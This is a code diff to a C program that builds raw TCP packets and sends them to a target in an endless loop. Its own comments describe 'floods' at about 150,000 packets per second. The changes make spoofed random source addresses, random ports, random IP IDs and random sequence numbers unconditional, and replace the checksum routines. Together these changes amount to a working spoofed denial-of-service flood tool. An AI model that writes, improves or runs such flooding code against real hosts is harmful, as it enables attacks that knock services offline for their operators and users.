@@ -24,8 +24,8 @@ License: MIT
 #define DEBUG 0 // Set verbosity
 #define DELAY 0 // Set delay between packets in seconds
 #define RAND_SRC_ADDR 1 // Toggle source address randomization
-#define RAND_SRC_PORT 0 // Toggle source port randomization
-#define INCREMENT_ID 1 // Toggle incrementing of IP ID field
+#define RAND_SRC_PORT 1 // Toggle source port randomization
+#define RAND_ID 1 // Toggle incrementing of IP ID field
 #define FAST_CSUM 0 // Toggle fast checksum updating (experimental)
 
 #define PROTO_TCP_OPT_NOP   1
@@ -86,6 +86,50 @@ uint32_t rand_next(void) //period 2^96-1
     w ^= w >> 19;
     w ^= t;
     return w;
+}
+
+uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
+    register unsigned long sum = 0;
+
+    for (sum = 0; count > 1; count -= 2)
+        sum += *addr++;
+    if (count == 1)
+        sum += (char)*addr;
+
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    
+    return ~sum;
+}
+
+uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
+    const uint16_t *buf = buff;
+    uint32_t ip_src = iph->saddr;
+    uint32_t ip_dst = iph->daddr;
+    uint32_t sum = 0;
+    int length = len;
+    
+    while (len > 1)
+    {
+        sum += *buf;
+        buf++;
+        len -= 2;
+    }
+
+    if (len == 1)
+        sum += *((uint8_t *) buf);
+
+    sum += (ip_src >> 16) & 0xFFFF;
+    sum += ip_src & 0xFFFF;
+    sum += (ip_dst >> 16) & 0xFFFF;
+    sum += ip_dst & 0xFFFF;
+    sum += htons(iph->protocol);
+    sum += data_len;
+
+    while (sum >> 16) 
+        sum = (sum & 0xFFFF) + (sum >> 16);
+
+    return ((uint16_t) (~sum));
 }
 
 static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
@@ -276,15 +320,15 @@ int main(int argc, char *argv[]) {
 	iph->tos = 0;
 	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + TCP_OPT_LEN + strlen(data); //20 bytes of options
 	iph->id = htonl(0);	//Id of this packet, can be any value
-	iph->frag_off = 0;
+	iph->frag_off = htons(1 <<14);
 	iph->ttl = 64;
 	iph->protocol = IPPROTO_TCP;
 	iph->check = 0;		//Set to 0 before calculating checksum
 	iph->saddr = inet_addr(default_src_addr);
 	iph->daddr = sin.sin_addr.s_addr;
 
-	// IP checksum
-	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+	// // IP checksum
+	// iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
 	// TCP Header
 	tcph->source = htons(default_src_port);
@@ -341,7 +385,7 @@ int main(int argc, char *argv[]) {
 	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
 	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data));
 
-	tcph->check = csum((unsigned short*) pseudogram, psize);
+	// tcph->check = csum((unsigned short*) pseudogram, psize);
 
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int option_value = 1;
@@ -354,47 +398,25 @@ int main(int argc, char *argv[]) {
 	__be32 new_saddr;
 	// Generate packets forever, the caller must terminate this program manually
 	while(1) {
-		#if RAND_SRC_ADDR || RAND_SRC_PORT || INCREMENT_ID
-			#if RAND_SRC_ADDR
-			// Generate a new random source IP, excluding certain prefixes
-			new_saddr = (__be32)(random_ipv4());
-			#endif
 
-			#if RAND_SRC_PORT
-				tcph->source = random_port();
-			#endif
+		// Generate a new random source IP, excluding certain prefixes
+		new_saddr = (__be32)(random_ipv4());
 
-			#if INCREMENT_ID
-				iph->id = htons(ntohs(iph->id) + 1);
-			#endif
+		tcph->source = rand_next() & 0xffff;
+		iph->id = rand_next() & 0xffff;
+		tcph->seq = rand_next() & 0xffff;
+		iph->saddr = new_saddr;
 
-			#if FAST_CSUM
-				/*
-				In theory these functions could enable faster floods by updating
-				checksums to account for modifications rather than recomputing
-				checksums from scratch for each packet.  The downside is that they only
-				allow chanigng a single header field at a time, which is currently
-				hard-coded to be the source IP.  Additionally, the speedup appears to be
-				irrelevant -- there is some other bottleneck in packet generation that
-				limits us to ~150,000 packets per second on current-gen hardware, even
-				with multi-threading.
-				*/
-			old_saddr = iph->saddr;
-				update_ip_csum(struct iphdr* iph, __be32 old_saddr);
-			update_tcp_csum(struct iphdr* iph, struct tcphdr* tcph, __be32 old_saddr);
-			#else
-			iph->check = 0;
-			iph->saddr = new_saddr;
-			iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+		iph->check = 0;
+		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
-			tcph->check = 0;
-				tcph->seq = new_saddr;
-			psh.source_address = new_saddr;
-			memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
-			memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data));
-			tcph->check = csum( (unsigned short*) pseudogram , psize);
-			#endif
-		#endif
+		tcph->check = 0;
+		tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + TCP_OPT_LEN), sizeof (struct tcphdr) + TCP_OPT_LEN);
+		
+		// psh.source_address = new_saddr;
+		// memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
+		// memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + TCP_OPT_LEN + strlen(data));
+		// tcph->check = csum( (unsigned short*) pseudogram , psize);
 
 		// Send the packet
 		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
@@ -406,7 +428,7 @@ int main(int argc, char *argv[]) {
 		#endif
 
 		#if DELAY
-		sleep(DELAY);
+			sleep(DELAY);
 		#endif
 
 		if (busy_wait) {
